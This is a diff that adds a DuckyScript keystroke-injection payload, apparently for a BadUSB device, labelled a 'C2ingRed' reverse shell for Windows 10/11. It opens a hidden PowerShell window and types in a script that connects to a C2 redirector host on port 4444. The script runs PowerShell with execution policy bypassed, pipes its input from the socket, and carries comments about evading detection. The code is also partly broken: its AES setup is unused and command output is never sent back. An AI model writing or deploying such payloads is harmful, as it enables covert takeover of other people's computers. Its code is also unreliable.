@@ -1,0 +1,52 @@
+REM Title: C2ingRed Reverse Shell
+REM Author: C2ingRed
+REM Description: Establishes a reverse shell to the C2 redirector
+REM Target: Windows 10/11
+REM Version: 1.0
+
+REM Configuration: Modify these values to match your redirector setup
+REM REDIRECTOR_HOST: Your redirector domain or IP
+REM REDIRECTOR_PORT: Port where shell handler is listening
+REM SHELL_TYPE: powershell or cmd
+
+REM ============= Start of configuration =============
+REM REDIRECTOR_HOST=cdn.example.com
+REM REDIRECTOR_PORT=4444
+REM SHELL_TYPE=powershell
+REM ============= End of configuration ===============
+
+REM Minimize the chance of detection by hiding the window
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 2000
+
+REM Main reverse shell payload
+STRING $ErrorActionPreference = 'SilentlyContinue'; Add-Type -AssemblyName System.Security; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; function cleanup { if (Get-Variable c -ErrorAction SilentlyContinue) { $c.Close() }; if (Get-Variable p -ErrorAction SilentlyContinue) { $p.Close() }; if (Get-Variable s -ErrorAction SilentlyContinue) { $s.Close() }; [GC]::Collect(); exit }
+ENTER
+
+REM Attempt to create socket connection with retry logic
+STRING $attempts = 0; $maxAttempts = 3; while ($attempts -lt $maxAttempts) { try { $c = New-Object System.Net.Sockets.TCPClient('cdn.example.com', 4444); if ($c.Connected) { break }; } catch { $attempts++; if ($attempts -ge $maxAttempts) { cleanup } else { Start-Sleep -Seconds 2 } }; }
+ENTER
+
+REM Setup streams
+STRING $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; $sl = New-Object System.Security.Cryptography.AesManaged; $sl.Mode = [System.Security.Cryptography.CipherMode]::CBC; $sl.Padding = [System.Security.Cryptography.PaddingMode]::Zeros; $sl.BlockSize = 128; $sl.KeySize = 256; $i = 0
+ENTER
+
+REM Execute either PowerShell or CMD shell based on configuration
+STRING $p = New-Object System.Diagnostics.Process; $p.StartInfo.FileName = 'powershell.exe'; $p.StartInfo.Arguments = '-NoProfile -ExecutionPolicy Bypass'; $p.StartInfo.UseShellExecute = $false; $p.StartInfo.RedirectStandardInput = $true; $p.StartInfo.RedirectStandardOutput = $true; $p.StartInfo.RedirectStandardError = $true; $p.StartInfo.CreateNoWindow = $true; $p.Start() | Out-Null
+ENTER
+
+REM Setup IO redirection
+STRING $is = $p.StandardInput; $os = $p.StandardOutput; $es = $p.StandardError; $osb = New-Object System.IO.MemoryStream; $esb = New-Object System.IO.MemoryStream; $osl = New-Object System.Threading.AutoResetEvent $false; $esl = New-Object System.Threading.AutoResetEvent $false; $od = $os.BaseStream.BeginRead($b, 0, $b.Length, $null, $null); $ed = $es.BaseStream.BeginRead($b, 0, $b.Length, $null, $null)
+ENTER
+
+REM Main communication loop
+STRING try { while ($true) { if ($c.Connected -ne $true -or ($osb.Length -eq 0 -and $i -gt 10000)) { cleanup }; $i = 0; Start-Sleep -Milliseconds 100; $ab = New-Object byte[] $c.Available; if ($ab.Length -gt 0) { $rd = $s.Read($ab, 0, $ab.Length); $dt = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($ab); $is.Write($dt); $i = 0 }; if ($p.HasExited) { cleanup }; } } catch { cleanup }
+ENTER
+
+REM Execute and complete
+STRING iex 'Get-Process | Select-Object ProcessName,Id,CPU | Sort-Object CPU -Descending | Select-Object -First 5'
+ENTER
